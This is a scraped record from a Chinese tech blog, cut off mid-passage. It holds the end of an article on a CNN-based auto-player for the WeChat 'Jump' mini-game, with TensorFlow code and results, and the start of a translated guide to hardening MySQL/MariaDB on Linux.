data-line=\"crayon-5a6f298006144740155551-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">forward</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'fine'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">name_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">variable_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conv2d</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">input_channle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># out = tf.layers.batch_normalization(out, name='bn1', training=is_training)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'relu1'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv5'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">reshape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">512</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">512</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f298006144740155551-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f298006144740155551-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0095 seconds] -->\r\n<p>经过十小时训练，fine模型测试集精度达到了0.5像素，实际测试精度大约为1像素，在测试机器上的inference时间0.2秒。</p>\n<h2>Cascade</h2>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1nfkakj20k004va9x.jpg\" width=\"690\" height=\"168\"></p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1gyb8ej20k00c00st.jpg\" width=\"690\" height=\"414\"></p>\n<p>总体精度1像素左右，时间0.6秒。</p>\n<h2>总结</h2>\n<p>针对这一问题，我们利用AI和CV技术，提出了合适适用于IOS和Android设备的完整解决方案，稍有技术背景的用户都可以实现成功配置、运行，我们提出了Multiscale-Search，Fast-Search，CNN Coarse-to-Fine三种解决这一问题的算法，三种算法相互配合，可以实现快速准确的搜索、跳跃，用户针对自己的设备稍加调整跳跃参数即可接近实现“永动机”。讲到这里，似乎可以宣布，我们的工作terminate了这个问题，微信小游戏跳一跳game over！</p>\n<p><b>友情提示：适度游戏益脑，沉迷游戏伤身，技术手段的乐趣在于技术本身而不在游戏排名，希望大家理性对待游戏排名和本文提出的技术，用游戏娱乐自己的生活</b></p>\n<p><b>声明：本文提出的算法及开源代码符合MIT开源协议，以商业目的使用该算法造成的一切后果须由使用者本人承担</b></p>\n<p>Git仓库地址：</p>\n<p>https://github.com/Prinsphield/Wechat_AutoJump</p>\n<p>https://github.com/Richard-An/Wechat_AutoJump</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113493\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113493votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113493\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 12 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "3"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/ede5c3a86638315dfe34f9b1a88065fe.png"], "title": "12 条用于 Linux 的 MySQL/MariaDB 安全最佳实践", "fav_nums": 2, "url": "http://blog.jobbole.com/113422/", "create_date": "2018/01/03", "url_object_id": "bf8e18875ff5e8a6c9a717b3ae5bd56d", "comment_nums": 1, "front_image_path": "full/d72465e7819b8a9a352bc3cbe4e1a4e31851a59c.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.tecmint.com/mysql-mariadb-security-best-practices-for-linux/\">tecmint</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-mariadb-security-best-practices-for-linux?print\">oschina</a>   </div><p>MySQL 是世界上最流行的开源数据库系统，MariaDB(一个 MySQL 分支)是世界上增长最快的开源数据库系统。在安装 MySQL 服务器之后，在默认配置下是不安全的，确保数据库安全通常是通用数据库管理的基本任务之一。</p>\n<div>\n<p>这将有助于增强和提升整个 Linux 服务器的安全性，因为攻击者总是扫描系统任意部分的漏洞，而数据库在过去是重点目标区域。一个常见的例子是对 MySQL 数据库的 root 密码的强制破解。</p>\n<p>在本指南中，我们将会讲解对开发者有帮助的 MySQL/MariaDB 的 Linux 最佳安全实践。</p>\n<h1>1. 安全地安装 MySQL</h1>\n<p>这是安装 MySQL 服务器后第一个建议的步骤，用于保护数据库服务器。这个脚本可以帮助您提高 MySQL 服务器的安全性：</p>\n<ul>\n<li>如果您在安装期间没有设置 root 帐户的密码，马上设置它</li>\n<li>通过删除可从本地主机外部访问的 root 帐户来禁用远程 root 用户登录</li>\n<li>删除匿名用户帐户和测试数据库，默认情况下，所有用户、甚至匿名用户都可以访问这些帐户和测试数据库</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957c5234488983\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#&amp;nbsp;mysql_secure_installation</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39a3957c5234488983-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39a3957c5234488983-1\"><span class=\"crayon-p\">#&amp;nbsp;mysql_secure_installation</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>在运行上述命令之后，设置 root 密码并通过输入 [Yes/Y] 和按下 [Enter] 键来回答一系列问题。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f36cccbc6907b330961ecc571419f939.png\"></p>\n<p style=\"text-align: center\"><em>安全安装 MySQL 情况界面</em></p>\n<h1>2. 将数据库服务器绑定到 Loopback 地址</h1>\n<p>此配置将限制来自远程机器的访问，它告诉 MySQL 服务器只接受来自本地主机的连接。你可以在主配置文件中进行设置。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39a3957ce429771195\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# vi /etc/my.cnf\t                   [RHEL/CentOS]\t\r\n# vi /etc/mysql/my.conf                    [Debian/Ubuntu] \r\nOR\r\n# vi /etc/mysql/mysql.conf.d/mysqld.cnf    